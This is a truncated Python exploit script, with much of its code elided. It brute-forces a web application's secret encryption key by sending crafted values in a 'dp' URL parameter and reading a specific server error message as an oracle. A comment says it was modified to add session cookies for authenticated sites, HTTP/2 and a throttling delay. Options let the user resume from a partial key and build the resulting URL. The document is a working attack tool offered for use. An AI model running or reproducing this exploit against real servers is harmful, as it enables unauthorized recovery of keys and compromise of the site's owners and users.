...
# I added in cookies for authenticated websites, changed it over to HTTP 2, and added a delay for sites that throttle 
...
def get_result(plaintext, key, session, pad_chars):
    ...
    # Prepare the request with HTTP/2
    cookies = {}
    if args.cookies:
    ...
    with httpx.Client(http2=True, cookies=cookies) as client:
        response = client.get(url + '?dp=' + dp_encrypted, headers=headers)
        ...
        # Display the server response for troubleshooting
        #print(f"Response Status Code: {response.status_code}")
        #print("Response Headers:", response.headers)
        #print("Response Content:", response.text[:2000])  # Display first 500 characters of the response

        # Check for the oracle message
...
def mode_brutekey():
    ...
    if found == '':
        ...
        for version in urls:
            ...
            # Update cookies directly in the session
            ...
            print(f"Response Status Code: {response.status_code}")
            print("Response Headers:", response.headers)
            print("Response Content:", response.text[:500])  # Display a snippet of the response content
...
encrypt_parser.add_argument('plaintext', action='store', type=str, default='', help='Plaintext to encrypt')
encrypt_parser.add_argument('key', action='store', type=str, default='', help='Key to encrypt')
...
brute_parser.add_argument('-l', '--key-len', action='store', type=int, default=48, help='Length of the key to retrieve, default is 48')
brute_parser.add_argument('-o', '--oracle', action='store', type=str, default='Index was outside the bounds of the array.', help='Oracle text to use, default for English version')
brute_parser.add_argument('-v', '--version', action='store', type=str, default='', help='Specify the version to use rather than testing the possibilities hardcoded within this exploit')
brute_parser.add_argument('-c', '--charset', action='store', type=str, default='hex', help='Charset used by the key, can use all, hex, printable, or user defined. Default is hex')
brute_parser.add_argument('-a', '--accuracy', action='store', type=int, default=9, help='Maximum accuracy, default is 9')
brute_parser.add_argument('-r', '--resume-key', action='store', type=str, default='', help='Specify a partial key to resume testing, or complete key to generate the URL')
brute_parser.add_argument('-p', '--proxy', action='store', type=str, default='', help='Specify a proxy server, e.g. 127.0.0.1:8080')
brute_parser.add_argument('--cookies', action='store', type=str, help='Cookies to be included in the request, in the form of key=value pairs.')
